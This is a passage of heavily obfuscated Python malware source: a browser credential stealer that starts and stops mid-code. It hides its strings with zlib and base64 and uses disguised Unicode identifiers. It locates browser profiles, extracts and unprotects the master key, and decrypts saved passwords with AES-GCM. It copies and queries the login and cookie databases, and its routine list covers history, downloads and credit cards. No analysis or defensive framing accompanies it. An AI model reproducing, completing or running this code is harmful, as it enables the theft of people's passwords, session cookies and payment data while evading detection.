__𝗶𝙢𝗽𝘰𝘳𝙩__('base64').b64decode(__𝗶𝙢𝘱𝗼𝘳𝘁__('zlib').decompress(b'x\xdaK\n\xcf\xc9J\xce\xb5\xacJ2\x8a2\xf0\t\x0f\xcb\x8e2\n\xb5\x05\x00Ji\x06\xb3')).decode(): 𝙨𝗲𝗹𝗳.appdata + __𝘪𝗺𝗽𝙤𝙧𝘁__('base64').b64decode(__𝘪𝗺𝘱𝙤𝘳𝙩__('zlib').decompress(b'x\xda\x8bp5,\x884\xf6*K6\xb2\xccMq\xabp\x8brO\xc9\x89p\x0b\xab\x8a\x8a\xf0L\x0frw3\x88\x0c\xb4\xb5\x05\x00\xda\x1a\x0b\xa2')).decode(), __𝙞𝘮𝘱𝗼𝘳𝘁__('base64').b64decode(__𝘪𝗺𝘱𝙤𝙧𝙩__('zlib').decompress(b'x\xdaK\x89\xf0\xcaHJ\xb7\xb5\x05\x00\x0c\xc8\x02\xb2')).decode(): 𝙨𝙚𝘭𝙛.appdata + __𝘪𝙢𝘱𝗼𝗿𝘵__('base64').b64decode(__𝗶𝘮𝘱𝘰𝘳𝘵__('zlib').decompress(b'x\xda\x8b\xf0\x08sI2.\xf0\x8b\n\x0f*\x88\x0c\xab\x08K\xceu+\x8dp\x0b\xab\x8a\x8a\xf0L\x0frw3\x88\x0c\xb4\xb5\x05\x00\xe4H\x0c\x0c')).decode(), __𝗶𝗺𝘱𝘰𝙧𝙩__('base64').b64decode(__𝙞𝘮𝙥𝘰𝘳𝙩__('zlib').decompress(b'x\xdaK\rw+\x8dr\x0f3\x01\x00\x0c\x9b\x02\xa3')).decode(): 𝘴𝗲𝗹𝙛.appdata + __𝘪𝘮𝗽𝙤𝗿𝘁__('base64').b64decode(__𝙞𝘮𝗽𝙤𝘳𝘁__('zlib').decompress(b'x\xda\x8bp\xcb\xc9H\xca\r\xcaIu\xab\x88\x8a\x0c7\xcd\x8e\x8a\xc8pN\xce\xb54N6\n\xab\x8cp\x0b\xab\x8a\x8a\xf0L\x0frw3\x88\x0c\xb4\xb5\x05\x00[\x84\x0e\xcd')).decode(), __𝙞𝙢𝗽𝗼𝗿𝙩__('base64').b64decode(__𝙞𝘮𝗽𝙤𝗿𝘁__('zlib').decompress(b'x\xda\x8b\xcc\xf3\xcaH\xc9\r\xb5\x05\x00\rT\x02\xdd')).decode(): 𝘀𝗲𝗹𝙛.appdata + __𝘪𝙢𝗽𝗼𝗿𝙩__('base64').b64decode(__𝙞𝙢𝗽𝙤𝙧𝙩__('zlib').decompress(b'x\xda\x8bp\xf5\xaa\x8c\x8c\x88\xca\t5\xb2\xccM\xf1H\xc9H\xce\rK\x0e\xcc\xf3\xcaH\xc9\r-\x01\xd2e)\xc6~9\xc99\x15a\xc9Fa\x95\x9e\xaeA\x19)\xee\xae\xb6\x00\xe9\xfe\x12W')).decode(), __𝙞𝙢𝘱𝙤𝙧𝘵__('base64').b64decode(__𝗶𝘮𝗽𝙤𝙧𝘁__('zlib').decompress(b'x\xdaK\x8c\xf0*\x88r\xcf1L\n\xb4\xb5\x05\x00\x1a\xa4\x03\xdf')).decode(): 𝘴𝗲𝗹𝙛.appdata + __𝘪𝘮𝗽𝙤𝗿𝘁__('base64').b64decode(__𝙞𝙢𝗽𝘰𝗿𝙩__('zlib').decompress(b'x\xda\x8bp\xcd\xa9L\x0c\x0f*H\t7L\x0e\x8b\xf0\xcbI\xcetr\x8d\x8c\x08\xca\x00\x00k\x07\x08r')).decode()})
        𝘀𝗲𝘁𝙖𝘁𝙩𝗿(𝙨𝘦𝗹𝙛, 'profiles', [__𝗶𝙢𝗽𝘰𝙧𝘁__('base64').b64decode(__𝘪𝘮𝘱𝙤𝙧𝘁__('zlib').decompress(b'x\xda\x0br\x0f\xcb\x8d\x8c\x08+Nq\xb4\xb5\x05\x00\x1a\x9f\x03\xf6')).decode(), __𝗶𝙢𝗽𝗼𝘳𝙩__('base64').b64decode(__𝗶𝙢𝗽𝗼𝙧𝙩__('zlib').decompress(b'x\xda\x0b\xf5\xf0*\x8b\xca\xcd)\x8e\nv\xac\x00\x00\x1c\x17\x04j')).decode(), __𝙞𝗺𝙥𝘰𝙧𝙩__('base64').b64decode(__𝙞𝗺𝘱𝗼𝙧𝘁__('zlib').decompress(b'x\xda\x0b\xf5\xf0*\x8b\xca\xcd)\x8e\nv\xac\x04\x00\x1c\x18\x04k')).decode(), __𝘪𝗺𝙥𝙤𝗿𝙩__('base64').b64decode(__𝗶𝗺𝙥𝙤𝘳𝘵__('zlib').decompress(b'x\xda\x0b\xf5\xf0*\x8b\xca\xcd)\x8e\nv\xac\x02\x00\x1c\x19\x04l')).decode(), __𝗶𝘮𝙥𝗼𝙧𝘵__('base64').b64decode(__𝘪𝙢𝙥𝘰𝘳𝙩__('zlib').decompress(b'x\xda\x0b\xf5\xf0*\x8b\xca\xcd)\x8e\nv4\x00\x00\x1b\xcf\x04"')).decode(), __𝗶𝘮𝘱𝗼𝙧𝙩__('base64').b64decode(__𝗶𝙢𝗽𝙤𝘳𝙩__('zlib').decompress(b'x\xda\x0b\xf5\xf0*\x8b\xca\xcd)\x8e\nv4\x04\x00\x1b\xd0\x04#')).decode()])
        for (_, 𝙥𝘢𝙩𝙝) in 𝘴𝘦𝗹𝗳.browsers.items():
            if not 𝙤𝘴.path.exists(𝘱𝘢𝙩𝗵):
                continue
            𝘴𝙚𝙩𝙖𝘵𝘵𝙧(𝙨𝘦𝘭𝘧, 'master_key', 𝘀𝗲𝗹𝙛.get_master_key(__𝙞𝘮𝘱𝘰𝗿𝘵__('base64').b64decode(__𝘪𝙢𝘱𝘰𝙧𝙩__('zlib').decompress(b'x\xdaK56L\x0eq\xb7\xcc\x8a\x0c/O\x0f5\x0e\xcaHq\x0f\xb5\x05\x00C*\x06x')).decode().format(𝗽𝘢𝘁𝗵)))
            if not 𝘀𝘦𝙡𝙛.master_key:
                continue
            for 𝗽𝗿𝙤𝘧𝘪𝙡𝗲 in 𝘴𝘦𝙡𝙛.profiles:
                if not 𝙤𝘀.path.exists(𝗽𝙖𝘵𝙝 + __𝘪𝙢𝗽𝙤𝘳𝘁__('base64').b64decode(__𝗶𝙢𝙥𝗼𝘳𝙩__('zlib').decompress(b'x\xda\x8bp\xb4\xb5\x05\x00\x02\xde\x01\x14')).decode() + 𝗽𝗿𝙤𝙛𝙞𝘭𝘦):
                    continue
                𝘰𝙥𝘦𝙧𝗮𝘁𝗶𝗼𝗻𝙨 = [𝘴𝙚𝗹𝙛.get_login_data, 𝘀𝗲𝘭𝗳.get_cookies, 𝘀𝗲𝙡𝘧.get_web_history, 𝙨𝘦𝗹𝘧.get_downloads, 𝘴𝘦𝙡𝘧.get_credit_cards]
                for 𝙤𝙥𝗲𝙧𝙖𝙩𝙞𝙤𝗻 in 𝗼𝘱𝙚𝘳𝙖𝘁𝘪𝙤𝙣𝘴:
                    try:
                        𝙤𝘱𝗲𝙧𝙖𝘁𝗶𝙤𝗻(𝗽𝘢𝙩𝙝, 𝗽𝙧𝙤𝘧𝘪𝙡𝘦)
                    except 𝙀𝘹𝙘𝗲𝙥𝙩𝙞𝙤𝗻 as e:
                        pass

    def get_master_key(self, path):
        if not 𝗼𝘴.path.exists(𝗽𝙖𝘵𝗵):
            return
        if __𝙞𝙢𝘱𝗼𝙧𝙩__('base64').b64decode(__𝗶𝗺𝙥𝘰𝙧𝘵__('zlib').decompress(b'x\xdaK2\xf6K\x8b4\xf62M\xf6\x08\xb4\x05\x00\x17\xac\x03\x8e')).decode() not in 𝙤𝙥𝘦𝘯(𝗽𝙖𝘁𝘩, __𝗶𝘮𝘱𝗼𝗿𝘵__('base64').b64decode(__𝙞𝙢𝘱𝗼𝘳𝘵__('zlib').decompress(b'x\xdaKN\xb7\xb5\x05\x00\x03|\x01E')).decode(), encoding=__𝗶𝗺𝙥𝘰𝙧𝙩__('base64').b64decode(__𝘪𝗺𝗽𝙤𝘳𝙩__('zlib').decompress(b'x\xdaK\x89\x08\xca\xf5\tI\xb7\x05\x00\x0c\xd4\x02\xc0')).decode()).read():
            return
        with 𝘰𝘱𝘦𝗻(𝗽𝗮𝘵𝙝, __𝗶𝗺𝘱𝘰𝘳𝘵__('base64').b64decode(__𝙞𝘮𝘱𝗼𝗿𝙩__('zlib').decompress(b'x\xdaKN\xb7\xb5\x05\x00\x03|\x01E')).decode(), encoding=__𝘪𝗺𝘱𝗼𝗿𝙩__('base64').b64decode(__𝗶𝙢𝘱𝘰𝘳𝙩__('zlib').decompress(b'x\xdaK\x89\x08\xca\xf5\tI\xb7\x05\x00\x0c\xd4\x02\xc0')).decode()) as 𝗳:
            𝙘 = 𝗳.read()
        𝘭𝙤𝘤𝗮𝘭_𝘀𝙩𝗮𝙩𝘦 = 𝙟𝘴𝙤𝗻.loads(𝗰)
        𝙢𝗮𝘴𝘵𝙚𝙧_𝘬𝘦𝙮 = 𝗯𝙖𝘀𝘦64.b64decode(𝗹𝙤𝘤𝘢𝙡_𝘴𝘁𝙖𝘵𝘦[__𝙞𝙢𝗽𝗼𝘳𝘵__('base64').b64decode(__𝙞𝙢𝙥𝗼𝗿𝘵__('zlib').decompress(b'x\xdaK2\xf6K\x8b4\xf62M\xf6\x08\xb4\x05\x00\x17\xac\x03\x8e')).decode()][__𝙞𝗺𝙥𝘰𝗿𝙩__('base64').b64decode(__𝗶𝘮𝗽𝘰𝘳𝙩__('zlib').decompress(b'x\xda\x8b\n7\xcdJ\xce\xcb)Oq\x0f\xcb\x8e0*\xc9I\r\xb4\xb5\x05\x00K\xf6\x07\x0b')).decode()])
        𝘮𝗮𝘀𝙩𝙚𝗿_𝗸𝙚𝘆 = 𝘮𝙖𝘀𝙩𝙚𝙧_𝙠𝙚𝘆[𝘪𝘯𝘵.from_bytes(𝘮𝗮𝙥(lambda O, i: 507 - (𝘪𝙣𝘵(𝙊) + 𝗶), 𝘮𝗮𝙥(__𝙞𝙢𝙥𝘰𝘳𝘵__('base64').b64decode(__𝙞𝗺𝙥𝙤𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝘪𝗽(*[𝙞𝙩𝙚𝗿(__𝙞𝗺𝗽𝗼𝘳𝘁__('base64').b64decode(__𝗶𝘮𝙥𝙤𝗿𝙩__('zlib').decompress(b'x\xda\xf3\x0bq\xac\x04\x00\x033\x01]')).decode())] * 3)), 𝗿𝙖𝗻𝗴𝗲(1)), __𝘪𝙢𝗽𝙤𝙧𝘵__('base64').b64decode(__𝙞𝘮𝗽𝗼𝙧𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False):]
        𝘮𝘢𝙨𝘁𝘦𝗿_𝙠𝙚𝘆 = 𝘊𝘳𝘆𝙥𝙩𝗨𝘯𝙥𝙧𝙤𝘵𝘦𝗰𝘵𝗗𝗮𝘵𝙖(𝘮𝙖𝘀𝘁𝙚𝗿_𝘬𝘦𝘺, None, None, None, 𝘪𝗻𝙩.from_bytes(𝙢𝘢𝘱(lambda O, i: 792 - (𝙞𝘯𝘵(𝘖) + 𝘪), 𝗺𝘢𝘱(__𝙞𝙢𝘱𝘰𝙧𝙩__('base64').b64decode(__𝙞𝗺𝗽𝗼𝘳𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝙞𝗽(*[𝗶𝘵𝗲𝙧(__𝗶𝘮𝗽𝙤𝘳𝘵__('base64').b64decode(__𝘪𝘮𝘱𝘰𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝗿𝙖𝗻𝘨𝗲(0)), __𝘪𝘮𝗽𝗼𝘳𝘵__('base64').b64decode(__𝗶𝗺𝘱𝙤𝙧𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False))[𝗶𝘯𝘵.from_bytes(𝗺𝙖𝙥(lambda O, i: 435 - (𝙞𝗻𝘁(𝘖) + 𝘪), 𝗺𝙖𝙥(__𝙞𝗺𝘱𝙤𝘳𝘵__('base64').b64decode(__𝗶𝙢𝙥𝘰𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝗶𝗽(*[𝙞𝙩𝘦𝗿(__𝘪𝗺𝙥𝘰𝘳𝘁__('base64').b64decode(__𝙞𝘮𝘱𝗼𝗿𝙩__('zlib').decompress(b'x\xda\xf3s\xf15\x00\x00\x02\xd2\x01\x10')).decode())] * 3)), 𝙧𝘢𝙣𝙜𝗲(1)), __𝗶𝗺𝙥𝗼𝘳𝘵__('base64').b64decode(__𝙞𝗺𝙥𝘰𝙧𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]
        return 𝘮𝗮𝙨𝘁𝘦𝗿_𝘬𝗲𝘺

    def decrypt_password(self, buff, master_key):
        𝙞𝘃 = 𝘣𝘶𝘧𝘧[𝗶𝗻𝘵.from_bytes(𝘮𝘢𝘱(lambda O, i: 471 - (𝘪𝗻𝘁(𝗢) + 𝙞), 𝘮𝙖𝘱(__𝙞𝗺𝗽𝗼𝗿𝘁__('base64').b64decode(__𝙞𝙢𝘱𝙤𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝘪𝙥(*[𝗶𝘵𝘦𝗿(__𝙞𝗺𝘱𝘰𝙧𝘵__('base64').b64decode(__𝘪𝘮𝙥𝘰𝘳𝘁__('zlib').decompress(b'x\xda\xf3s\x894\x01\x00\x02\xee\x01 ')).decode())] * 3)), 𝗿𝙖𝙣𝘨𝙚(1)), __𝘪𝗺𝗽𝗼𝗿𝙩__('base64').b64decode(__𝙞𝗺𝙥𝙤𝘳𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False):𝙞𝙣𝙩.from_bytes(𝙢𝗮𝗽(lambda O, i: 562 - (𝗶𝙣𝘁(𝗢) + 𝗶), 𝗺𝙖𝙥(__𝘪𝗺𝗽𝙤𝗿𝘵__('base64').b64decode(__𝘪𝘮𝗽𝗼𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝙞𝗽(*[𝘪𝙩𝗲𝘳(__𝗶𝙢𝗽𝙤𝗿𝘵__('base64').b64decode(__𝘪𝘮𝗽𝗼𝗿𝘁__('zlib').decompress(b"x\xda\xf3\x0b\t4\x06\x00\x03\r\x01'")).decode())] * 3)), 𝗿𝙖𝘯𝘨𝘦(1)), __𝗶𝘮𝙥𝗼𝙧𝘁__('base64').b64decode(__𝙞𝗺𝘱𝙤𝙧𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]
        𝙥𝗮𝘺𝙡𝘰𝙖𝙙 = 𝗯𝙪𝘧𝗳[𝘪𝗻𝙩.from_bytes(𝙢𝘢𝗽(lambda O, i: 372 - (𝙞𝘯𝘵(𝙊) + 𝙞), 𝘮𝘢𝗽(__𝙞𝘮𝙥𝘰𝗿𝘁__('base64').b64decode(__𝗶𝘮𝙥𝙤𝘳𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝙞𝗽(*[𝗶𝙩𝗲𝙧(__𝗶𝘮𝘱𝗼𝘳𝙩__('base64').b64decode(__𝙞𝘮𝘱𝗼𝗿𝘁__('zlib').decompress(b'x\xda\xf3\xad\n5\x06\x00\x03\x83\x01P')).decode())] * 3)), 𝘳𝘢𝗻𝘨𝗲(1)), __𝙞𝙢𝗽𝗼𝙧𝘁__('base64').b64decode(__𝙞𝘮𝘱𝗼𝘳𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False):]
        𝗰𝙞𝘱𝘩𝙚𝘳 = 𝘼𝗘𝘚.new(𝙢𝘢𝘀𝙩𝗲𝘳_𝘬𝗲𝙮, 𝗔𝗘𝘚.MODE_GCM, 𝗶𝙫)
        𝗱𝗲𝘤𝘳𝘺𝘱𝘁𝙚𝗱_𝘱𝗮𝘴𝘴 = 𝗰𝘪𝗽𝗵𝗲𝘳.decrypt(𝗽𝙖𝘆𝗹𝙤𝙖𝘥)
        𝘥𝙚𝙘𝘳𝙮𝙥𝘁𝘦𝘥_𝙥𝗮𝘀𝘀 = 𝘥𝘦𝙘𝗿𝘆𝗽𝘵𝗲𝙙_𝗽𝘢𝘴𝙨[:-𝘪𝙣𝘁.from_bytes(𝙢𝘢𝘱(lambda O, i: 692 - (𝗶𝙣𝙩(𝗢) + 𝘪), 𝘮𝙖𝙥(__𝗶𝗺𝘱𝗼𝙧𝘵__('base64').b64decode(__𝙞𝘮𝙥𝘰𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝘪𝗽(*[𝘪𝘁𝗲𝗿(__𝙞𝘮𝘱𝙤𝘳𝙩__('base64').b64decode(__𝗶𝘮𝘱𝙤𝘳𝘵__('zlib').decompress(b'x\xda\xf3\xcbJ6\x02\x00\x03r\x01N')).decode())] * 3)), 𝘳𝘢𝘯𝙜𝘦(1)), __𝙞𝙢𝘱𝙤𝗿𝘁__('base64').b64decode(__𝘪𝗺𝙥𝘰𝙧𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)].decode()
        return 𝙙𝙚𝙘𝙧𝙮𝗽𝙩𝗲𝗱_𝙥𝗮𝙨𝘴

    def get_login_data(self, path, profile):
        𝗹𝗼𝗴𝙞𝙣_𝘥𝘣 = __𝗶𝙢𝙥𝙤𝘳𝘁__('base64').b64decode(__𝙞𝘮𝙥𝙤𝙧𝘁__('zlib').decompress(b'x\xdaK56LN\x05\xe2\x10w\xcb\xbc\xc4p\x93\xf4 w7\x83\xc8@[[\x00Z\\\x07!')).decode().format(𝘱𝗮𝘁𝘩, 𝗽𝘳𝙤𝗳𝘪𝙡𝙚)
        if not 𝘰𝘀.path.exists(𝗹𝘰𝘨𝗶𝘯_𝘥𝗯):
            return
        𝘴𝙝𝙪𝘵𝗶𝗹.copy(𝘭𝗼𝘨𝘪𝙣_𝘥𝗯, __𝗶𝗺𝘱𝘰𝗿𝘵__('base64').b64decode(__𝘪𝗺𝙥𝘰𝗿𝘵__('zlib').decompress(b'x\xdaKr\xb7\xccK\x0c7M\x8br\xf7\xb4\x05\x00\x19z\x03\xcb')).decode())
        𝗰𝙤𝗻𝘯 = 𝘴𝙦𝙡𝙞𝘵𝙚3.connect(__𝘪𝘮𝘱𝘰𝙧𝘁__('base64').b64decode(__𝗶𝘮𝙥𝘰𝘳𝘁__('zlib').decompress(b'x\xdaKr\xb7\xccK\x0c7M\x8br\xf7\xb4\x05\x00\x19z\x03\xcb')).decode())
        𝗰𝙪𝙧𝙨𝗼𝘳 = 𝗰𝗼𝗻𝙣.cursor()
        𝗰𝙪𝙧𝘀𝙤𝗿.execute(__𝙞𝘮𝗽𝘰𝗿𝘁__('base64').b64decode(__𝗶𝙢𝘱𝘰𝗿𝙩__('zlib').decompress(b'x\xda\x05\xc1\xbb\x0e@0\x14\x00\xd0_\xd2\x9a:XH\xfa\x10:\x90\xbe\xeeX\x06\xe1\x9a\xa4\x0f\xbe\xde9\xa6\xb1\xf3b\xb4Q\x82\x9f\xbb\xc0\x1c\x91\x91\xed.\x8f\x92\xf6\x03?\xa6\xe0\x08\xfa\x16\x8e(-NC_\x82\xd7\xdfN\xd9\x0b\x9c\xd1\xe0*\x81\xb5\x17\xe6bZ\x89\x9a\x81b\xdaJ\xd7\xfd\xaf\xbb\x1c3')).decode())
        for 𝗿𝙤𝘄 in 𝘤𝘶𝙧𝘀𝙤𝗿.fetchall():
            if not 𝙧𝙤𝘄[𝘪𝘯𝘵.from_bytes(𝙢𝗮𝘱(lambda O, i: 372 - (𝗶𝘯𝘵(𝙊) + 𝗶), 𝙢𝗮𝘱(__𝘪𝗺𝗽𝘰𝙧𝙩__('base64').b64decode(__𝘪𝘮𝘱𝗼𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝗶𝙥(*[𝘪𝘁𝗲𝙧(__𝘪𝗺𝗽𝘰𝘳𝘁__('base64').b64decode(__𝘪𝗺𝙥𝘰𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝙧𝙖𝗻𝗴𝙚(0)), __𝗶𝘮𝘱𝘰𝘳𝘵__('base64').b64decode(__𝘪𝘮𝗽𝗼𝘳𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] or not 𝗿𝘰𝘄[𝗶𝘯𝘵.from_bytes(𝗺𝘢𝘱(lambda O, i: 408 - (𝘪𝗻𝘵(𝙊) + 𝗶), 𝙢𝘢𝗽(__𝗶𝗺𝗽𝘰𝗿𝘵__('base64').b64decode(__𝗶𝘮𝘱𝙤𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝙞𝘱(*[𝘪𝘵𝗲𝗿(__𝗶𝙢𝘱𝙤𝙧𝘁__('base64').b64decode(__𝘪𝗺𝙥𝘰𝙧𝘁__('zlib').decompress(b'x\xda\xf3sq4\x06\x00\x02\xbd\x01\x07')).decode())] * 3)), 𝙧𝙖𝘯𝘨𝙚(1)), __𝙞𝗺𝙥𝘰𝘳𝘵__('base64').b64decode(__𝙞𝙢𝘱𝘰𝗿𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] or (not 𝗿𝘰𝘸[𝘪𝙣𝘁.from_bytes(𝙢𝘢𝘱(lambda O, i: 865 - (𝙞𝘯𝘁(𝘖) + 𝙞), 𝘮𝗮𝘱(__𝙞𝗺𝙥𝘰𝙧𝙩__('base64').b64decode(__𝙞𝙢𝘱𝘰𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝙞𝙥(*[𝙞𝙩𝘦𝙧(__𝙞𝘮𝙥𝙤𝗿𝘵__('base64').b64decode(__𝘪𝙢𝗽𝘰𝘳𝙩__('zlib').decompress(b'x\xda\xf3w\x89\xac\x02\x00\x038\x01g')).decode())] * 3)), 𝙧𝘢𝗻𝗴𝘦(1)), __𝙞𝗺𝘱𝘰𝘳𝘵__('base64').b64decode(__𝗶𝘮𝙥𝘰𝘳𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]):
                continue
            𝘱𝗮𝘀𝘴𝘄𝙤𝙧𝗱 = 𝘀𝘦𝗹𝗳.decrypt_password(𝘳𝙤𝘸[𝘪𝗻𝘁.from_bytes(𝘮𝙖𝙥(lambda O, i: 728 - (𝘪𝘯𝙩(𝘖) + 𝗶), 𝘮𝙖𝘱(__𝙞𝙢𝙥𝙤𝘳𝘵__('base64').b64decode(__𝗶𝗺𝙥𝗼𝘳𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝘪𝗽(*[𝗶𝙩𝘦𝙧(__𝘪𝙢𝘱𝘰𝙧𝙩__('base64').b64decode(__𝘪𝘮𝙥𝗼𝘳𝙩__('zlib').decompress(b'x\xda\xf3\xab\xf24\x02\x00\x03n\x01D')).decode())] * 3)), 𝘳𝗮𝘯𝙜𝗲(1)), __𝙞𝗺𝙥𝙤𝙧𝙩__('base64').b64decode(__𝘪𝗺𝙥𝗼𝘳𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝘴𝗲𝗹𝙛.master_key)
            __𝗟𝗢𝘎𝙄𝙉𝙎__.append(𝗧𝙮𝙥𝙚𝘴.Login(𝙧𝘰𝙬[𝗶𝗻𝙩.from_bytes(𝘮𝘢𝘱(lambda O, i: 272 - (𝙞𝘯𝘵(𝘖) + 𝙞), 𝗺𝗮𝘱(__𝗶𝗺𝘱𝙤𝗿𝘵__('base64').b64decode(__𝗶𝘮𝙥𝗼𝘳𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝗶𝗽(*[𝗶𝘁𝙚𝙧(__𝗶𝗺𝘱𝘰𝙧𝙩__('base64').b64decode(__𝙞𝘮𝘱𝙤𝙧𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝘳𝘢𝙣𝙜𝘦(0)), __𝗶𝙢𝘱𝗼𝘳𝙩__('base64').b64decode(__𝘪𝙢𝙥𝗼𝙧𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝙧𝘰𝘄[𝘪𝘯𝘁.from_bytes(𝗺𝘢𝘱(lambda O, i: 978 - (𝗶𝙣𝘵(𝙊) + 𝘪), 𝘮𝗮𝙥(__𝗶𝘮𝙥𝙤𝗿𝘁__('base64').b64decode(__𝙞𝘮𝗽𝘰𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝙞𝘱(*[𝘪𝙩𝙚𝙧(__𝘪𝙢𝘱𝘰𝘳𝘁__('base64').b64decode(__𝘪𝗺𝘱𝙤𝗿𝘁__('zlib').decompress(b'x\xda\xf3\x0fI6\x06\x00\x035\x01:')).decode())] * 3)), 𝙧𝘢𝘯𝗴𝙚(1)), __𝙞𝗺𝘱𝙤𝗿𝘵__('base64').b64decode(__𝙞𝙢𝗽𝗼𝗿𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝗽𝘢𝘀𝘀𝘄𝙤𝗿𝙙))
        𝘤𝘰𝘯𝗻.close()
        𝗼𝘴.remove(__𝘪𝗺𝗽𝗼𝙧𝘵__('base64').b64decode(__𝘪𝘮𝙥𝘰𝘳𝘵__('zlib').decompress(b'x\xdaKr\xb7\xccK\x0c7M\x8br\xf7\xb4\x05\x00\x19z\x03\xcb')).decode())

    def get_cookies(self, path, profile):
        𝗰𝘰𝘰𝙠𝗶𝘦_𝗱𝘣 = __𝙞𝙢𝙥𝗼𝘳𝘁__('base64').b64decode(__𝗶𝗺𝗽𝗼𝗿𝙩__('zlib').decompress(b'x\xdaK56LN\x05\xe2\x90\xdc0\x83\x14#\xcb\xcaD\xc3\n\x97$#\xcb\xa2\xc4\xf0\xb0*\x00}L\x08\xfd')).decode().format(𝙥𝙖𝙩𝙝, 𝗽𝙧𝗼𝘧𝙞𝘭𝗲)
        if not 𝙤𝘴.path.exists(𝙘𝗼𝗼𝘬𝗶𝙚_𝘥𝙗):
            return
        𝘀𝘩𝙪𝙩𝙞𝘭.copy(𝗰𝙤𝘰𝙠𝘪𝗲_𝗱𝗯, __𝙞𝗺𝙥𝘰𝘳𝘁__('base64').b64decode(__𝙞𝗺𝘱𝙤𝘳𝘵__('zlib').decompress(b'x\xda\x8b4\xb2,K4\xca\xc9\x890\n\xca\x04\x00\x18\xcb\x03\xeb')).decode())
        𝗰𝙤𝗻𝗻 = 𝙨𝘲𝙡𝙞𝘵𝘦3.connect(__𝙞𝗺𝗽𝗼𝘳𝘵__('base64').b64decode(__𝙞𝗺𝗽𝘰𝙧𝘵__('zlib').decompress(b'x\xda\x8b4\xb2,K4\xca\xc9\x890\n\xca\x04\x00\x18\xcb\x03\xeb')).decode())
        𝘤𝘶𝙧𝘴𝘰𝗿 = 𝗰𝗼𝗻𝘯.cursor()
        𝘤𝙪𝙧𝘀𝘰𝗿.execute(__𝘪𝘮𝘱𝗼𝘳𝘁__('base64').b64decode(__𝗶𝙢𝗽𝗼𝘳𝘵__('zlib').decompress(b'x\xda\x0b5\x08\xf3\r\n\xf5\x0b\xf5t\xcf(K6\x0eJK4\n3\xf5qv*\x8d\x0c7\xcc\x01\xd2\xe5\x91\x11A\xf9@:\')\xd7\xaf25\xc2\xc9 *<(-%\xd7\xad8%<\xb48*"\xa3<1\xc2+\'\xd9\xd0\xd20\xc5\xdd7=(\xc7+ $\xd8)+\xc9\xc8\xb2(1<\xac\n\x00\x84\xd0\x1e\xe1')).decode())
        for 𝙧𝘰𝘄 in 𝙘𝙪𝗿𝘀𝘰𝗿.fetchall():
            if not 𝙧𝘰𝘸[𝙞𝙣𝘵.from_bytes(𝙢𝘢𝙥(lambda O, i: 603 - (𝘪𝗻𝙩(𝗢) + 𝗶), 𝘮𝘢𝘱(__𝙞𝗺𝙥𝙤𝘳𝘁__('base64').b64decode(__𝗶𝗺𝘱𝘰𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝘪𝙥(*[𝘪𝘵𝙚𝘳(__𝗶𝗺𝘱𝗼𝙧𝙩__('base64').b64decode(__𝗶𝘮𝘱𝙤𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝘳𝗮𝗻𝘨𝘦(0)), __𝙞𝙢𝗽𝘰𝗿𝙩__('base64').b64decode(__𝙞𝘮𝗽𝙤𝙧𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] or not 